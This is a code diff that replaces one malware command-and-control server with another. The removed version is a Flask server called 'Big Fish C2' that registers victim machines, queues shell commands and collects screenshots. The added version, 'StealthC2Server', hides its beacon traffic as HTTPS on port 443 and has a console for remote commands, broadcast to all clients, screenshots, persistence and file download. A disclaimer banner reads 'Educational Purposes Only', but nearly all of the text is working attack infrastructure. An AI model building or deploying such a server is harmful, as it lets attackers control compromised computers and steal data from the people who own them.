@@ -1,545 +1,305 @@
-#!/usr/bin/env python3
-"""
-Stable Big Fish C2 Server - Fixed stability issues
-"""
-from flask import Flask, request, jsonify, send_file
-from flask_cors import CORS
-from flask_socketio import SocketIO, emit
-import time
-import uuid
-import sqlite3
+import socket
 import threading
-import os
-import hashlib
-from datetime import datetime
-import base64
+import time
 import json
-import logging
-from cryptography.fernet import Fernet
-import atexit
-import signal
+import sys
+import os
+from datetime import datetime
+import select
+import ssl
+import base64
+import hashlib
+import random
 
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
-
-app = Flask(__name__)
-CORS(app, origins="*")
-
-# Fix SocketIO configuration - use proper async mode
-try:
-    import eventlet
-    eventlet.monkey_patch()
-    socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', ping_timeout=60, ping_interval=25)
-    logger.info("Using eventlet for SocketIO")
-except:
-    try:
-        import gevent
-        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent', ping_timeout=60, ping_interval=25)
-        logger.info("Using gevent for SocketIO")
-    except:
-        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60, ping_interval=25)
-        logger.info("Using threading for SocketIO")
-
-# Configuration
-DATABASE = 'bigfish_stable.db'
-ONLINE_THRESHOLD = 120  # 2 minutes
-DOWNLOAD_FOLDER = 'downloads_stable'
-UPLOAD_FOLDER = 'uploads_stable'
-SCREENSHOTS_FOLDER = 'screenshots_stable'
-
-# Create folders
-for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, SCREENSHOTS_FOLDER]:
-    os.makedirs(folder, exist_ok=True)
-
-# Load or generate encryption key
-KEY_FILE = 'encryption_stable.key'
-if os.path.exists(KEY_FILE):
-    with open(KEY_FILE, 'rb') as f:
-        ENCRYPTION_KEY = f.read()
-else:
-    ENCRYPTION_KEY = Fernet.generate_key()
-    with open(KEY_FILE, 'wb') as f:
-        f.write(ENCRYPTION_KEY)
-
-cipher = Fernet(ENCRYPTION_KEY)
-
-class ConnectionPool:
-    """Database connection pool for better performance"""
-    _connections = {}
-    
-    @classmethod
-    def get_connection(cls, db_path=DATABASE):
-        thread_id = threading.get_ident()
-        if thread_id not in cls._connections:
-            conn = sqlite3.connect(db_path, check_same_thread=False)
-            conn.row_factory = sqlite3.Row
-            cls._connections[thread_id] = conn
-        return cls._connections[thread_id]
-    
-    @classmethod
-    def close_all(cls):
-        for conn in cls._connections.values():
-            conn.close()
-        cls._connections.clear()
-
-atexit.register(ConnectionPool.close_all)
-
-def init_db():
-    """Initialize database with optimized tables"""
-    conn = ConnectionPool.get_connection()
-    c = conn.cursor()
-    
-    # Clients table with optimized indexes
-    c.execute("""CREATE TABLE IF NOT EXISTS clients (
-        id TEXT PRIMARY KEY,
-        hostname TEXT,
-        username TEXT,
-        os TEXT,
-        ip TEXT,
-        last_seen REAL,
-        status TEXT DEFAULT 'offline',
-        created_at REAL,
-        online_hours REAL DEFAULT 0,
-        last_command_time REAL DEFAULT 0
-    )""")
-    
-    # Commands table with status tracking
-    c.execute("""CREATE TABLE IF NOT EXISTS commands (
-        id TEXT PRIMARY KEY,
-        client_id TEXT,
-        command TEXT,
-        command_type TEXT DEFAULT 'shell',
-        status TEXT DEFAULT 'pending',
-        output TEXT,
-        created_at REAL,
-        executed_at REAL,
-        retry_count INTEGER DEFAULT 0,
-        FOREIGN KEY (client_id) REFERENCES clients(id)
-    )""")
-    
-    # Create optimized indexes
-    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
-    
-    conn.commit()
-    logger.info("[✓] Database initialized")
-
-init_db()
-
-def get_client_info(client_id):
-    """Get client info with connection pool"""
-    conn = ConnectionPool.get_connection()
-    c = conn.cursor()
-    c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
-    result = c.fetchone()
-    return dict(result) if result else None
-
-def update_client_last_seen(client_id):
-    """Update client last seen timestamp"""
-    conn = ConnectionPool.get_connection()
-    c = conn.cursor()
-    current_time = time.time()
-    
-    c.execute("""UPDATE clients SET 
-                last_seen = ?, 
-                status = CASE WHEN ? - last_seen > ? THEN 'offline' ELSE 'online' END
-                WHERE id = ?""",
-             (current_time, current_time, ONLINE_THRESHOLD, client_id))
-    
-    conn.commit()
-    return current_time
-
-# ==================== FIXED ROUTES ====================
-
-@app.route('/')
-def index():
-    return jsonify({
-        'status': 'online',
-        'system': 'Big Fish C2 Stable',
-        'version': '4.1',
-        'timestamp': time.time()
-    })
-
-@app.route('/api/health')
-def health():
-    return jsonify({'status': 'healthy', 'timestamp': time.time()})
-
-@app.route('/api/checkin', methods=['POST'])
-def client_checkin():
-    """Simplified and stable checkin endpoint"""
-    try:
-        data = request.json or {}
-        current_time = time.time()
+class StealthC2Server:
+    def __init__(self, host='0.0.0.0', port=443):  # Use HTTPS port
+        self.host = host
+        self.port = port
+        self.clients = {}  # {client_id: {'socket': socket, 'last_seen': timestamp, 'online': bool, 'info': dict}}
+        self.client_lock = threading.Lock()
+        self.running = True
+        self.command_queue = {}  # {client_id: [commands]}
         
-        # Generate or get client ID
-        client_id = data.get('id') or str(uuid.uuid4())
-        hostname = data.get('hostname', 'Unknown')
-        username = data.get('username', 'Unknown')
-        os_info = data.get('os', 'Unknown')
+        # SSL Context for HTTPS-like traffic
+        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        self.context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
         
-        # Get client IP
-        if request.headers.get('X-Forwarded-For'):
-            client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
-        else:
-            client_ip = request.remote_addr
+        # Generate with: openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes
         
-        conn = ConnectionPool.get_connection()
-        c = conn.cursor()
-        
-        # Check if client exists
-        c.execute('SELECT id, status, online_hours FROM clients WHERE id = ?', (client_id,))
-        existing = c.fetchone()
-        
-        if existing:
-            # Update existing client
-            online_hours = existing['online_hours']
-            if existing['status'] == 'offline':
-                online_hours += 0.1  # Add small increment
-            
-            c.execute("""UPDATE clients SET 
-                        hostname=?, username=?, os=?, ip=?, last_seen=?,
-                        status='online', online_hours=?
-                        WHERE id=?""",
-                     (hostname, username, os_info, client_ip, current_time, online_hours, client_id))
-        else:
-            # Insert new client
-            c.execute("""INSERT INTO clients 
-                        (id, hostname, username, os, ip, last_seen, status, created_at, online_hours)
-                        VALUES (?, ?, ?, ?, ?, ?, 'online', ?, 0.1)""",
-                     (client_id, hostname, username, os_info, client_ip, current_time, current_time))
-        
-        conn.commit()
-        
-        logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
-        
-        return jsonify({
-            'status': 'ok',
-            'client_id': client_id,
-            'timestamp': current_time
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Checkin error: {str(e)[:100]}")
-        return jsonify({'status': 'error', 'message': str(e)[:100]}), 500
-
-@app.route('/api/clients', methods=['GET'])
-def get_all_clients():
-    """Get all clients - optimized"""
-    try:
-        current_time = time.time()
-        
-        conn = ConnectionPool.get_connection()
-        c = conn.cursor()
-        
-        # Update offline status
-        c.execute("UPDATE clients SET status='offline' WHERE ? - last_seen > ?", 
-                 (current_time, ONLINE_THRESHOLD))
-        conn.commit()
-        
-        # Get clients with simple query
-        c.execute("""SELECT id, hostname, username, os, ip, last_seen, status, 
-                    created_at, online_hours,
-                    (SELECT COUNT(*) FROM commands WHERE client_id = clients.id AND status = 'completed') as command_count
-                    FROM clients 
-                    ORDER BY last_seen DESC""")
-        
-        clients = []
-        for row in c.fetchall():
-            client = dict(row)
-            client['last_seen_str'] = datetime.fromtimestamp(client['last_seen']).strftime('%H:%M:%S')
-            client['created_str'] = datetime.fromtimestamp(client['created_at']).strftime('%Y-%m-%d')
-            
-            # Calculate status with more tolerance
-            time_diff = current_time - client['last_seen']
-            if time_diff < 30:
-                client['status'] = 'online'
-                client['status_icon'] = '🟢'
-            elif time_diff < ONLINE_THRESHOLD:
-                client['status'] = 'idle'
-                client['status_icon'] = '🟡'
-            else:
-                client['status'] = 'offline'
-                client['status_icon'] = '🔴'
-            
-            clients.append(client)
-        
-        return jsonify({'clients': clients})
-        
-    except Exception as e:
-        logger.error(f"[✗] Get clients error: {e}")
-        return jsonify({'clients': []})
-
-@app.route('/api/commands/<client_id>', methods=['GET'])
-def get_pending_commands(client_id):
-    """Get pending commands with timeout handling"""
-    try:
-        current_time = update_client_last_seen(client_id)
-        
-        conn = ConnectionPool.get_connection()
-        c = conn.cursor()
-        
-        # Get pending commands (limit to 5 at a time)
-        c.execute("""SELECT id, command, command_type 
-                    FROM commands 
-                    WHERE client_id = ? AND status = 'pending'
-                    ORDER BY created_at ASC 
-                    LIMIT 5""", (client_id,))
-        
-        commands = []
-        command_ids = []
-        for row in c.fetchall():
-            commands.append({
-                'id': row['id'],
-                'command': row['command'],
-                'type': row['command_type']
-            })
-            command_ids.append(row['id'])
-        
-        # Mark commands as sent
-        if command_ids:
-            placeholders = ','.join(['?'] * len(command_ids))
-            c.execute(f"""UPDATE commands SET status = 'sent' 
-                       WHERE id IN ({placeholders})""", command_ids)
-            conn.commit()
-        
-        # Emit heartbeat
-        socketio.emit('heartbeat', {
-            'client_id': client_id,
-            'timestamp': current_time
-        }, namespace='/')
-        
-        return jsonify({'commands': commands})
-        
-    except Exception as e:
-        logger.error(f"[✗] Get commands error: {e}")
-        return jsonify({'commands': []})
-
-@app.route('/api/command/result', methods=['POST'])
-def submit_command_result():
-    """Submit command result with error handling"""
-    try:
-        data = request.json or {}
-        command_id = data.get('command_id')
-        output = data.get('output', '')
-        status = data.get('status', 'completed')
-        
-        if not command_id:
-            return jsonify({'error': 'Missing command_id'}), 400
-        
-        conn = ConnectionPool.get_connection()
-        c = conn.cursor()
-        
-        # Get command info first
-        c.execute("SELECT client_id, command FROM commands WHERE id = ?", (command_id,))
-        cmd_info = c.fetchone()
-        
-        if not cmd_info:
-            return jsonify({'error': 'Command not found'}), 404
-        
-        # Truncate output if too large
-        if len(output) > 10000:
-            output = output[:10000] + "\n...[truncated]"
-        
-        # Update command
-        c.execute("""UPDATE commands SET 
-                    status = ?, output = ?, executed_at = ?
-                    WHERE id = ?""",
-                 (status, output, time.time(), command_id))
-        
-        conn.commit()
-        
-        # Emit result
-        socketio.emit('command_result', {
-            'command_id': command_id,
-            'client_id': cmd_info['client_id'],
-            'command': cmd_info['command'],
-            'status': status,
-            'timestamp': time.time()
-        }, namespace='/')
-        
-        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
-        
-        return jsonify({'success': True})
-        
-    except Exception as e:
-        logger.error(f"[✗] Submit result error: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-@app.route('/api/command', methods=['POST'])
-def send_command():
-    """Send command to client"""
-    try:
-        data = request.json or {}
-        client_id = data.get('client_id')
-        command_text = data.get('command')
-        
-        if not client_id or not command_text:
-            return jsonify({'error': 'Missing parameters'}), 400
-        
-        # Check if client exists
-        client_info = get_client_info(client_id)
-        if not client_info:
-            return jsonify({'error': 'Client not found'}), 404
-        
-        # Create command
-        cmd_id = str(uuid.uuid4())
-        
-        conn = ConnectionPool.get_connection()
-        c = conn.cursor()
-        
-        c.execute("""INSERT INTO commands 
-                    (id, client_id, command, created_at, status)
-                    VALUES (?, ?, ?, ?, 'pending')""",
-                 (cmd_id, client_id, command_text, time.time()))
-        
-        conn.commit()
-        
-        # Emit event
-        socketio.emit('new_command', {
-            'command_id': cmd_id,
-            'client_id': client_id,
-            'command': command_text,
-            'timestamp': time.time()
-        }, namespace='/')
-        
-        logger.info(f"[✓] Command sent to {client_id[:8]}")
-        
-        return jsonify({
-            'success': True,
-            'command_id': cmd_id
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Send command error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/screenshot', methods=['POST'])
-def upload_screenshot():
-    """Upload screenshot - fixed endpoint"""
-    try:
-        if 'file' not in request.files:
-            return jsonify({'error': 'No file provided'}), 400
-        
-        file = request.files['file']
-        client_id = request.form.get('client_id')
-        
-        if not client_id:
-            return jsonify({'error': 'No client ID'}), 400
-        
-        if file.filename == '':
-            return jsonify({'error': 'No filename'}), 400
-        
-        # Get client info
-        client_info = get_client_info(client_id)
-        if not client_info:
-            return jsonify({'error': 'Client not found'}), 404
-        
-        # Create client folder
-        client_folder = os.path.join(SCREENSHOTS_FOLDER, client_id)
-        os.makedirs(client_folder, exist_ok=True)
-        
-        # Save file
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"screenshot_{timestamp}.png"
-        filepath = os.path.join(client_folder, filename)
-        
-        file.save(filepath)
-        
-        logger.info(f"[✓] Screenshot saved: {filename}")
-        
-        return jsonify({
-            'success': True,
-            'filename': filename
-        })
-        
-    except Exception as e:
-        logger.error(f"[✗] Screenshot upload error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-# ==================== WEB SOCKET EVENTS ====================
-
-@socketio.on('connect', namespace='/')
-def handle_connect():
-    logger.info(f"[✓] WebSocket connected: {request.sid}")
-    emit('connected', {'message': 'Connected to stable server', 'timestamp': time.time()})
-
-@socketio.on('disconnect', namespace='/')
-def handle_disconnect():
-    logger.info(f"[✓] WebSocket disconnected: {request.sid}")
-
-@socketio.on('ping', namespace='/')
-def handle_ping(data):
-    emit('pong', {'timestamp': time.time()})
-
-# ==================== BACKGROUND TASKS ====================
-
-def cleanup_task():
-    """Background cleanup task"""
-    while True:
+    def start(self):
+        """Start the C2 server with SSL"""
         try:
-            current_time = time.time()
-            conn = ConnectionPool.get_connection()
-            c = conn.cursor()
+            # Create raw socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self.host, self.port))
+            sock.listen(100)
             
-            # Clean old completed commands (older than 1 day)
-            cutoff = current_time - (24 * 3600)
-            c.execute("DELETE FROM commands WHERE executed_at < ? AND status = 'completed'", (cutoff,))
+            # Wrap with SSL
+            ssl_sock = self.context.wrap_socket(sock, server_side=True)
             
-            # Clean old sent commands that never got results (older than 1 hour)
-            cutoff = current_time - 3600
-            c.execute("""DELETE FROM commands WHERE status = 'sent' 
-                       AND created_at < ?""", (cutoff,))
+            print(f"[+] Stealth C2 Server started on {self.host}:{self.port} (HTTPS)")
+            print("[+] Waiting for beacon connections...")
             
-            conn.commit()
+            # Start console and monitor threads
+            threading.Thread(target=self.console, daemon=True).start()
+            threading.Thread(target=self.monitor_clients, daemon=True).start()
+            threading.Thread(target=self.cleanup_dead_clients, daemon=True).start()
             
-            # Emit stats update
-            c.execute("SELECT COUNT(*) FROM clients WHERE status = 'online'")
-            online_count = c.fetchone()[0]
-            
-            socketio.emit('stats_update', {
-                'online_count': online_count,
-                'timestamp': current_time
-            }, namespace='/')
-            
-            logger.debug(f"[✓] Cleanup completed, {online_count} clients online")
-            
+            while self.running:
+                try:
+                    readable, _, _ = select.select([ssl_sock], [], [], 1)
+                    if readable:
+                        client_socket, client_address = ssl_sock.accept()
+                        
+                        # Handle in separate thread
+                        client_thread = threading.Thread(
+                            target=self.handle_client,
+                            args=(client_socket, client_address)
+                        )
+                        client_thread.daemon = True
+                        client_thread.start()
+                except Exception as e:
+                    if self.running:
+                        print(f"[-] Accept error: {e}")
+                    
         except Exception as e:
-            logger.error(f"[✗] Cleanup error: {e}")
-        
-        time.sleep(60)  # Run every minute
+            print(f"[-] Server error: {e}")
+        finally:
+            self.stop()
+    
+    def handle_client(self, client_socket, client_address):
+        """Handle client beacon connections"""
+        client_id = None
+        try:
+            # Initial beacon handshake
+            data = client_socket.recv(4096)
+            if not data:
+                return
+            
+            # Decode beacon data (encrypted/obfuscated)
+            try:
+                beacon_data = json.loads(base64.b64decode(data).decode())
+                client_id = beacon_data.get('id', hashlib.md5(str(client_address).encode()).hexdigest()[:8])
+                system_info = beacon_data.get('info', {})
+                
+                with self.client_lock:
+                    self.clients[client_id] = {
+                        'socket': client_socket,
+                        'address': client_address,
+                        'last_seen': time.time(),
+                        'online': True,
+                        'info': system_info,
+                        'first_seen': time.time()
+                    }
+                
+                print(f"[+] Beacon check-in: {client_id} | {system_info.get('hostname', 'Unknown')}")
+                print(f"    IP: {client_address[0]} | OS: {system_info.get('os', 'Unknown')}")
+                
+                # Send pending commands if any
+                if client_id in self.command_queue and self.command_queue[client_id]:
+                    command = self.command_queue[client_id].pop(0)
+                    client_socket.send(base64.b64encode(command.encode()))
+                else:
+                    client_socket.send(base64.b64encode("idle".encode()))
+                
+                # Keep connection open for a bit to receive output
+                time.sleep(0.5)
+                
+                # Check for command output
+                try:
+                    output_data = client_socket.recv(16384)
+                    if output_data:
+                        output = base64.b64decode(output_data).decode('utf-8', errors='ignore')
+                        print(f"\n[+] Output from {client_id}:\n{output}\n")
+                except:
+                    pass
+                    
+            except:
+                # Legacy or malformed connection
+                client_socket.close()
+                
+        except Exception as e:
+            print(f"[-] Client handler error: {e}")
+        finally:
+            if client_id:
+                with self.client_lock:
+                    if client_id in self.clients:
+                        self.clients[client_id]['online'] = False
+    
+    def monitor_clients(self):
+        """Monitor client status and display changes"""
+        last_status = {}
+        while self.running:
+            time.sleep(5)
+            with self.client_lock:
+                current_time = time.time()
+                for client_id, client_data in self.clients.items():
+                    was_online = last_status.get(client_id, False)
+                    is_online = client_data['online']
+                    
+                    if not was_online and is_online:
+                        print(f"[+] CLIENT ONLINE: {client_id} - {client_data['info'].get('hostname', 'Unknown')}")
+                    elif was_online and not is_online:
+                        print(f"[-] CLIENT OFFLINE: {client_id} - {client_data['info'].get('hostname', 'Unknown')}")
+                    
+                    last_status[client_id] = is_online
+                
+                # Print status summary every 30 seconds
+                if int(time.time()) % 30 == 0:
+                    online_count = sum(1 for c in self.clients.values() if c['online'])
+                    print(f"\n[STATUS] Online: {online_count} | Total: {len(self.clients)} | Time: {datetime.now().strftime('%H:%M:%S')}\n")
+    
+    def cleanup_dead_clients(self):
+        """Remove clients offline for too long"""
+        while self.running:
+            time.sleep(60)
+            with self.client_lock:
+                current_time = time.time()
+                to_remove = []
+                for client_id, client_data in list(self.clients.items()):
+                    if not client_data['online'] and (current_time - client_data['last_seen']) > 300:  # 5 minutes
+                        to_remove.append(client_id)
+                
+                for client_id in to_remove:
+                    del self.clients[client_id]
+                    print(f"[!] Removed stale client: {client_id}")
+    
+    def console(self):
+        """Interactive command console"""
+        while self.running:
+            try:
+                cmd = input("\nC2> ").strip()
+                
+                if not cmd:
+                    continue
+                
+                if cmd.lower() == 'exit':
+                    self.running = False
+                    print("[+] Shutting down...")
+                    os._exit(0)
+                
+                elif cmd.lower() == 'help':
+                    self.show_help()
+                
+                elif cmd.lower() == 'list':
+                    self.list_clients()
+                
+                elif cmd.lower().startswith('use '):
+                    self.select_client(cmd[4:].strip())
+                
+                elif cmd.lower().startswith('cmd '):
+                    self.send_command(cmd[4:].strip())
+                
+                elif cmd.lower().startswith('broadcast '):
+                    self.broadcast_command(cmd[10:].strip())
+                
+                elif cmd.lower() == 'status':
+                    self.show_status()
+                
+                elif cmd.lower().startswith('screenshot'):
+                    self.queue_command('screenshot')
+                
+                elif cmd.lower().startswith('persist'):
+                    self.queue_command('persist')
+                
+                elif cmd.lower().startswith('download '):
+                    self.queue_command(cmd)
+                
+                else:
+                    print(f"Unknown command: {cmd}")
+                    
+            except KeyboardInterrupt:
+                print("\n[!] Interrupted. Type 'exit' to quit.")
+            except Exception as e:
+                print(f"Console error: {e}")
+    
+    def show_help(self):
+        help_text = """
+        C2 Commands:
+        ------------
+        help                - Show this help
+        list                - List all connected clients
+        use <client_id>     - Select a client for interaction
+        cmd <command>       - Execute command on selected client
+        broadcast <cmd>     - Send command to all online clients
+        status              - Show server status
+        screenshot          - Capture screenshot from client
+        persist             - Install persistence on client
+        download <file>     - Download file from client
+        exit               - Shutdown server
+        """
+        print(help_text)
+    
+    def list_clients(self):
+        with self.client_lock:
+            if not self.clients:
+                print("No clients connected")
+                return
+            
+            print(f"\n{'ID':<10} {'Status':<10} {'Hostname':<20} {'IP':<15} {'Last Seen':<20}")
+            print("-" * 80)
+            for client_id, data in self.clients.items():
+                status = "ONLINE" if data['online'] else "OFFLINE"
+                last_seen = datetime.fromtimestamp(data['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
+                hostname = data['info'].get('hostname', 'Unknown')[:18]
+                ip = data['address'][0] if 'address' in data else 'N/A'
+                
+                print(f"{client_id:<10} {status:<10} {hostname:<20} {ip:<15} {last_seen:<20}")
+    
+    def select_client(self, client_id):
+        with self.client_lock:
+            if client_id in self.clients:
+                print(f"[+] Selected client: {client_id}")
+                # In a full implementation, you'd set a global selected_client
+            else:
+                print(f"[-] Client not found: {client_id}")
+    
+    def send_command(self, command):
+        # Simplified - in real implementation, you'd send to selected client
+        print(f"[+] Command queued: {command}")
+        # self.command_queue[client_id].append(command)
+    
+    def broadcast_command(self, command):
+        with self.client_lock:
+            for client_id in self.clients:
+                if client_id not in self.command_queue:
+                    self.command_queue[client_id] = []
+                self.command_queue[client_id].append(command)
+            print(f"[+] Broadcast command to {len(self.clients)} clients: {command}")
+    
+    def queue_command(self, command):
+        print(f"[+] Special command queued: {command}")
+    
+    def show_status(self):
+        with self.client_lock:
+            online = sum(1 for c in self.clients.values() if c['online'])
+            total = len(self.clients)
+            print(f"\n[Server Status]")
+            print(f"Online clients: {online}/{total}")
+            print(f"Uptime: {time.time() - self.start_time if hasattr(self, 'start_time') else 0:.0f}s")
+            print(f"Port: {self.port}")
+            print(f"Command queue size: {sum(len(q) for q in self.command_queue.values())}")
+    
+    def stop(self):
+        self.running = False
+        print("[+] Server stopped")
 
-# ==================== MAIN ====================
-
-def signal_handler(signum, frame):
-    """Handle shutdown signals"""
-    logger.info("[!] Shutdown signal received")
-    ConnectionPool.close_all()
-    logger.info("[✓] Clean shutdown")
-    sys.exit(0)
-
-if __name__ == '__main__':
-    import signal
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
+if __name__ == "__main__":
+    print("""
+    ╔══════════════════════════════════════╗
+    ║       STEALTH C2 SERVER              ║
+    ║      Educational Purposes Only       ║
+    ╚══════════════════════════════════════╝
+    """)
     
-    PORT = int(os.environ.get('PORT', 5001))
+    # Generate SSL cert if not exists
+    if not os.path.exists('cert.pem'):
+        print("[!] SSL certificate not found. Generate with:")
+        print("    openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes")
+        print("[!] Or disable SSL in code for testing")
+        sys.exit(1)
     
-    # Start cleanup thread
-    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
-    cleanup_thread.start()
-    
-    logger.info(f"[✓] Stable Big Fish C2 Server starting on port {PORT}")
-    logger.info(f"[✓] Press Ctrl+C to stop")
-    
-    try:
-        socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
-    except KeyboardInterrupt:
-        logger.info("[!] Server stopped by user")
-    finally:
-        ConnectionPool.close_all()
+    server = StealthC2Server(port=443)
+    server.start_time = time.time()
+    server.start()
